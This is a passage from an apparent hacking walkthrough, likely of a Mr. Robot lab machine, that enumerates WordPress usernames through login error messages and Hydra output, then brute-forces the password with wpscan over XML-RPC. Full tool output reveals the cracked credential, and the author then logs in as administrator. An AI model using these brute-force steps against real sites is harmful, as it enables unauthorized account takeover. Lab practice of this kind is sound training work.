[80][http-post-form] host: 10.0.0.48   login: the   password: test
[80][http-post-form] host: 10.0.0.48   login: now   password: test
[80][http-post-form] host: 10.0.0.48   login: Wikia   password: test
[80][http-post-form] host: 10.0.0.48   login: extensions   password: test
[80][http-post-form] host: 10.0.0.48   login: window   password: test
[80][http-post-form] host: 10.0.0.48   login: http   password: test
[80][http-post-form] host: 10.0.0.48   login: var   password: test
[80][http-post-form] host: 10.0.0.48   login: Robot   password: test
[80][http-post-form] host: 10.0.0.48   login: Elliot   password: test
```
  
The best thing we can do is go to the login page of our target (http://10.0.0.48/wp-login) and just type in each username with a random password. And when we get the error message;  
"ERROR: The password you entered for the username XXX is incorrect"  
Once you see that, then you know you have a registered username.  
I found the username "Elliot" by doing this technique. Now. It is time to crack the password!  
  
### Cracking WordPress Passwords  
The ultimate dream right here! Being able to crack WordPress websites with a password dictionary bruteforce. And this is actually much easier to accomplish than what you think. Let's look at how we can 
brute force the password to our target "Elliot".  
```
$ wpscan --url 10.0.0.48 --rua --passwords passwords.txt --usernames Elliot  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database
[i] Update completed.

[+] URL: http://10.0.0.48/ [10.0.0.48]
[+] Started: Thu Dec 29 07:13:37 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.0.0.48/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.0.0.48/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.0.0.48/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.0.0.48/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.30 identified (Outdated, released on 0001-01-01).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.0.0.48/daf29fc.html, Match: '-release.min.js?ver=4.3.30'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.0.0.48/daf29fc.html, Match: 'WordPress 4.3.30'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.0.0.48/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.0.0.48/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.0.0.48/wp-content/themes/twentyfifteen/style.css?ver=4.3.30
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.0.0.48/wp-content/themes/twentyfifteen/style.css?ver=4.3.30, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot / ER28-0652                                                                                                                                                                                                              
All Found                                                                                                                                                                                                                                   

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Dec 29 07:38:51 2022
[+] Requests Done: 1905
[+] Cached Requests: 6
[+] Data Sent: 614.655 KB
[+] Data Received: 195.53 MB
[+] Memory used: 336.176 MB
[+] Elapsed time: 00:25:14
```
Okay. So after we see the [SUCCESS] we can now go back to the website and enter these credentials;  
**Username:**  
*Elliot*  
**Password:**  
*ER28-0652*  
Now that we have access, it is time to see what privileges we have access too. Let's use the left-side menu and click on Users.  
Locate the user "Elliot" and look to the right. We should see "Role" -> "Administrator"
And now... We have access as Admin throughout the entire site!  
Have some fun, and remember who showed you how to hack a WordPress site ;)  
